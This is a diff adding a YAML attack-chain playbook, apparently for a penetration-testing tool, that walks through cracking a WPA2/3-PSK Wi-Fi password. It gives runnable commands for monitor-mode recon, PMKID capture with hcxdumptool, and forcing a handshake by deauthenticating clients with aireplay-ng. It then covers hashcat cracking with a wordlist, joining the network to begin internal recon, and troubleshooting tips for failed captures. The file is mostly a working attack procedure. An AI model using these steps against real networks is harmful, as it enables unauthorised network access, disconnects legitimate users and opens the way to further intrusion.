@@ -1,0 +1,91 @@
+chain_id: wpa2_pmkid_handshake_crack
+title: "Wi-Fi WPA2/3 — PMKID + 4-way handshake capture → offline crack"
+severity: HIGH
+tags: [wireless, wifi, wpa2, wpa3, pmkid, handshake, hashcat, recon]
+
+trigger:
+  any_of:
+    - { kind: "wifi_in_range" }
+    - { kind: "wireless_engagement" }
+
+description: |
+  Two paths to crack a WPA2/3-PSK on a target network:
+
+    1. **PMKID** — many APs leak their PMKID in the first EAPOL frame
+       to any station that asks. Capture takes seconds with a single
+       client-less probe; no victim required.
+    2. **4-way handshake** — wait for any client to (re-)associate, or
+       force one with a deauth. Slightly more invasive, more
+       reliable when AP doesn't expose PMKID.
+
+  Both convert to hashcat mode 22000 and crack offline. Day-0 wireless
+  pentest move. WPA3-Personal SAE has stronger RNG but cracked PSKs
+  still recover the network identity-and-data layer.
+
+steps:
+  - id: 1
+    title: "Recon — find APs in range and pick one"
+    command: |
+      sudo airmon-ng check kill
+      sudo airmon-ng start wlan0
+      sudo airodump-ng wlan0mon
+      # Pick: BSSID, channel, target ESSID
+
+  - id: 2
+    title: "PMKID capture (clientless, faster)"
+    command: |
+      sudo hcxdumptool -i wlan0mon -o capture.pcapng \
+        --enable_status=1 --filterlist_ap=$(echo "<BSSID>" | tr -d ':' | tr 'A-F' 'a-f') \
+        --filtermode=2
+
+  - id: 3
+    title: "4-way handshake capture (with optional deauth)"
+    command: |
+      sudo airodump-ng -c <CH> --bssid <BSSID> -w handshake wlan0mon &
+      # In another terminal — kick a client:
+      sudo aireplay-ng --deauth 5 -a <BSSID> -c <CLIENT_MAC> wlan0mon
+      # Capture file: handshake-01.cap
+
+  - id: 4
+    title: "Convert to hashcat 22000 format"
+    command: |
+      hcxpcapngtool -o hashes.22000 capture.pcapng
+      # Or for handshake .cap:
+      hcxpcapngtool -o hashes.22000 handshake-01.cap
+      cat hashes.22000  # WPA*02*<pmkid>*<bssid>*<ssid>*…
+
+  - id: 5
+    title: "Crack offline"
+    command: |
+      hashcat -m 22000 hashes.22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+      # GPU rig: --workload-profile 4
+
+  - id: 6
+    title: "Once cracked — connect & enumerate"
+    command: |
+      cat > /tmp/wpa.conf <<CFG
+      ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
+      network={
+          ssid="<ESSID>"
+          psk="<cracked-passphrase>"
+      }
+      CFG
+      sudo wpa_supplicant -B -i wlan0 -c /tmp/wpa.conf
+      sudo dhclient wlan0
+      # Internal AD recon now lands in scope.
+
+common_errors:
+  - error: "hcxdumptool captures nothing for hours"
+    solution: |
+      AP is PMKID-disabled (modern Cisco / Aruba defaults). Switch to
+      handshake-only — clients need to (re-)associate. Force with a
+      directed deauth or wait for a sync hour (start of work day).
+  - error: "Hashcat shows 'No hashes loaded'"
+    solution: |
+      Format mismatch — old EAPOL `.cap` files use mode 22000 only
+      after `hcxpcapngtool` conversion. Don't use older 16800 (PMKID
+      only) or 2500 (handshake only) modes; both retired.
+
+references:
+  - https://hashcat.net/wiki/doku.php?id=wpa2-handshake_recovery_with_hashcat_for_dummies
+  - https://github.com/ZerBea/hcxdumptool
